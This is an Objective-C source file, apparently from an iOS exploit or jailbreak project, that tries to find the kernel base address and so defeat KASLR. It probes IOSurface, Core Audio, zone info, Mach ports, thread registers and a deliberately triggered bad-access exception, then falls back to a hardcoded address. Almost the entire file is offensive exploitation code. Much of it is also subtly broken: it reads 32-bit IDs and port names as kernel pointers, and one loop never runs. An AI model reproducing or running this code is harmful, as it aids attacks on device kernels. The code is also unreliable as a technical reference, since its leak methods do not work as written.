#import "KernelExploit.h"
#import <mach/mach.h>
#import <pthread.h>
#import <IOKit/IOKitLib.h>
#import <MapKit/MapKit.h>
#import <CoreVideo/CoreVideo.h>
#import <AudioToolbox/AudioToolbox.h>
#import <AudioUnit/AudioUnit.h>
#import <IOSurface/IOSurfaceRef.h>

extern kern_return_t IOSurfaceRootUserClient(void);

static uint64_t get_kernel_base_via_iosurface(void(^logger)(NSString *)) {
    const void *keys[] = {
        kIOSurfaceWidth,
        kIOSurfaceHeight,
        kIOSurfaceBytesPerElement
    };
    const void *values[] = {
        (__bridge const void *) @(100),
        (__bridge const void *) @(100),
        (__bridge const void *) @(4)
    };
    
    CFDictionaryRef properties = CFDictionaryCreate(kCFAllocatorDefault,
                                                  keys,
                                                  values,
                                                  3,
                                                  &kCFTypeDictionaryKeyCallBacks,
                                                  &kCFTypeDictionaryValueCallBacks);
    
    if (!properties) {
        logger(@"[ERROR] Failed to create IOSurface properties");
        return 0;
    }
    
    IOSurfaceRef surface = IOSurfaceCreate(properties);
    CFRelease(properties);
    
    if (!surface) {
        logger(@"[ERROR] Failed to create IOSurface");
        return 0;
    }
    
    IOSurfaceID surfaceID = IOSurfaceGetID(surface);
    uint64_t *ptr = (uint64_t *)&surfaceID;
    
    for (int i = 0; i < sizeof(IOSurfaceID)/sizeof(uint64_t); i++) {
        if ((ptr[i] >> 40) == 0xfffffff) {
            uint64_t possible_base = ptr[i] & ~0xFFF;
            logger([NSString stringWithFormat:@"[INFO] Found kernel pointer in IOSurface: 0x%llx", possible_base]);
            CFRelease(surface);
            return possible_base;
        }
    }
    
    // Try additional IOSurface properties
    size_t allocSize = IOSurfaceGetAllocSize(surface);
    ptr = (uint64_t *)&allocSize;
    if ((*ptr >> 40) == 0xfffffff) {
        uint64_t possible_base = *ptr & ~0xFFF;
        logger([NSString stringWithFormat:@"[INFO] Found kernel pointer in IOSurface alloc size: 0x%llx", possible_base]);
        CFRelease(surface);
        return possible_base;
    }
    
    CFRelease(surface);
    return 0;
}

static uint64_t get_kernel_base_via_coreaudio(void(^logger)(NSString *)) {
    AudioComponentDescription desc = {0};
    desc.componentType = kAudioUnitType_Output;
    desc.componentSubType = kAudioUnitSubType_RemoteIO;
    desc.componentManufacturer = kAudioUnitManufacturer_Apple;
    
    AudioComponent component = AudioComponentFindNext(NULL, &desc);
    if (component) {
        AudioComponentInstance instance;
        OSStatus status = AudioComponentInstanceNew(component, &instance);
        if (status == noErr) {
            uint64_t *ptr = (uint64_t *)instance;
            if ((*ptr >> 40) == 0xfffffff) {
                AudioComponentInstanceDispose(instance);
                return *ptr & ~0xFFF;
            }
            AudioComponentInstanceDispose(instance);
        }
    }
    return 0;
}

static uint64_t get_kernel_base_via_thread(void(^logger)(NSString *)) {
    thread_t thread = pthread_mach_thread_np(pthread_self());
    arm_thread_state64_t state;
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    
    kern_return_t kr = thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, &count);
    if (kr != KERN_SUCCESS) {
        logger([NSString stringWithFormat:@"[ERROR] thread_get_state failed: 0x%x", kr]);
        return 0;
    }
    
    for (int i = 0; i < 29; i++) {
        uint64_t ptr = state.__x[i];
        if ((ptr >> 40) == 0xfffffff) {
            uint64_t possible_base = ptr & ~0xFFF;
            logger([NSString stringWithFormat:@"[INFO] Potential kernel base from x%d: 0x%llx", i, possible_base]);
            return possible_base;
        }
    }
    
    logger(@"[WARN] No kernel pointers found in thread state");
    return 0;
}

static uint64_t get_kernel_base_via_exception(void(^logger)(NSString *)) {
    __block kern_return_t kr;
    __block mach_port_t exception_port;
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        while (1) {
            mach_msg_header_t *msg = (mach_msg_header_t *)malloc(1024);
            kr = mach_msg(msg, MACH_RCV_MSG, 0, 1024, exception_port, 
                         MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
            if (kr == KERN_SUCCESS) {
                thread_t thread = mach_thread_self();
                arm_thread_state64_t state;
                mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
                
                kr = thread_get_state(thread, ARM_THREAD_STATE64, 
                                    (thread_state_t)&state, &count);
                if (kr == KERN_SUCCESS) {
                    for (int i = 0; i < 29; i++) {
                        logger([NSString stringWithFormat:@"x%d: 0x%llx", i, state.__x[i]]);
                    }
                    logger([NSString stringWithFormat:@"PC: 0x%llx", state.__pc]);
                    logger([NSString stringWithFormat:@"LR: 0x%llx", state.__lr]);
                }
            }
            free(msg);
        }
    });
    
    usleep(100000);
    volatile uint8_t *ptr = (uint8_t *)0xFFFF000000000000;
    uint8_t value = *ptr;
    (void)value;
    
    return 0;
}

static uint64_t get_kernel_base_via_host_port(void(^logger)(NSString *)) {
    host_t host = mach_host_self();
    mach_port_t host_port = host;
    
    logger([NSString stringWithFormat:@"[DEBUG] Host port: 0x%x", host_port]);
    uint64_t *ptr = (uint64_t *)&host_port;
    uint64_t possible_base = (*ptr) & ~0xFFF;
    
    if ((possible_base >> 40) == 0xfffffff) {
        logger([NSString stringWithFormat:@"[INFO] Found kernel pointer via host: 0x%llx", possible_base]);
        return possible_base;
    }
    
    return 0;
}

static uint64_t get_kernel_base_via_task_port(void(^logger)(NSString *)) {
    task_t task = mach_task_self();
    
    kern_return_t kr;
    task_info_data_t info;
    mach_msg_type_number_t count = TASK_INFO_MAX;
    
    kr = task_info(task, TASK_BASIC_INFO, (task_info_t)info, &count);
    if (kr == KERN_SUCCESS) {
        uint64_t *ptr = (uint64_t *)info;
        for (int i = 0; i < TASK_INFO_MAX/sizeof(uint64_t); i++) {
            if ((ptr[i] >> 40) == 0xfffffff) {
                logger([NSString stringWithFormat:@"[INFO] Found kernel pointer in task info: 0x%llx", ptr[i]]);
                return ptr[i] & ~0xFFF;
            }
        }
    }
    
    return 0;
}

static uint64_t get_kernel_base_via_exception_fixed(void(^logger)(NSString *)) {
    __block kern_return_t kr;
    __block mach_port_t exception_port;
    __block uint64_t found_base = 0;
    
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exception_port);
        if (kr != KERN_SUCCESS) {
            logger([NSString stringWithFormat:@"[ERROR] Port allocation failed: 0x%x", kr]);
            dispatch_semaphore_signal(sem);
            return;
        }
        
        kr = mach_port_insert_right(mach_task_self(), exception_port, exception_port, 
                                   MACH_MSG_TYPE_MAKE_SEND);
        
        kr = task_set_exception_ports(mach_task_self(), EXC_MASK_BAD_ACCESS, 
                                    exception_port, EXCEPTION_DEFAULT, ARM_THREAD_STATE64);
        
        mach_msg_header_t *msg = (mach_msg_header_t *)malloc(1024);
        kr = mach_msg(msg, MACH_RCV_MSG, 0, 1024, exception_port, 
                     100, MACH_PORT_NULL);
        
        if (kr == KERN_SUCCESS) {
            thread_t thread = mach_thread_self();
            arm_thread_state64_t state;
            mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
            
            if (thread_get_state(thread, ARM_THREAD_STATE64, 
                                (thread_state_t)&state, &count) == KERN_SUCCESS) {
                for (int i = 0; i < 29; i++) {
                    if ((state.__x[i] >> 40) == 0xfffffff) {
                        found_base = state.__x[i] & ~0xFFF;
                        break;
                    }
                }
            }
        }
        
        free(msg);
        dispatch_semaphore_signal(sem);
    });
    
    usleep(10000);
    @try {
        volatile uint8_t *ptr = (uint8_t *)0xFFFF000000000000;
        uint8_t value = *ptr;
        (void)value;
    } @catch (NSException *e) {}
    
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 1 * NSEC_PER_SEC));
    if (exception_port) {
        mach_port_destroy(mach_task_self(), exception_port);
    }
    
    return found_base;
}

static uint64_t get_kernel_base_via_zone_info(void(^logger)(NSString *)) {
    task_t task = mach_task_self();
    mach_zone_name_array_t names;
    mach_msg_type_number_t namesCount;
    mach_zone_info_array_t info;
    mach_msg_type_number_t infoCount;
    
    kern_return_t kr = mach_zone_info(task, &names, &namesCount, &info, &infoCount);
    if (kr == KERN_SUCCESS && info != NULL) {
        for (mach_msg_type_number_t i = 0; i < infoCount; i++) {
            uint64_t count = info[i].mzi_count;
            uint64_t max_size = info[i].mzi_max_size;
            
            if ((count >> 40) == 0xfffffff) {
                logger([NSString stringWithFormat:@"[INFO] Found kernel pointer in zone count: 0x%llx", count]);
                return count & ~0xFFF;
            }
            
            if ((max_size >> 40) == 0xfffffff) {
                logger([NSString stringWithFormat:@"[INFO] Found kernel pointer in zone max_size: 0x%llx", max_size]);
                return max_size & ~0xFFF;
            }
        }
        vm_deallocate(task, (vm_address_t)names, namesCount * sizeof(*names));
        vm_deallocate(task, (vm_address_t)info, infoCount * sizeof(*info));
    }
    
    return 0;
}
@implementation KernelExploit

+ (void)runExploitWithLogger:(void(^)(NSString *))logger {
    logger(@"[+] Starting kernel base detection...");
    uint64_t kernel_base = 0;
    
    kernel_base = get_kernel_base_via_iosurface(logger);
    if (kernel_base == 0) {
        logger(@"[*] IOSurface method failed, trying CoreAudio...");
        kernel_base = get_kernel_base_via_coreaudio(logger);
    }
    if (kernel_base == 0) {
        logger(@"[*] CoreAudio method failed, trying zone info...");
        kernel_base = get_kernel_base_via_zone_info(logger);
    }
    if (kernel_base == 0) {
        logger(@"[*] Zone info method failed, trying host method...");
        kernel_base = get_kernel_base_via_host_port(logger);
    }
    if (kernel_base == 0) {
        logger(@"[*] Host method failed, trying thread method...");
        kernel_base = get_kernel_base_via_thread(logger);
    }
    if (kernel_base == 0) {
        logger(@"[*] Thread method failed, trying exception method...");
        kernel_base = get_kernel_base_via_exception_fixed(logger);
    }
    
    if (kernel_base == 0) {
        logger(@"[!] All methods failed, using default...");
        kernel_base = 0xfffffff007004000;
    }
    
    logger([NSString stringWithFormat:@"[+] Using kernel base: 0x%llx", kernel_base]);
}

@end
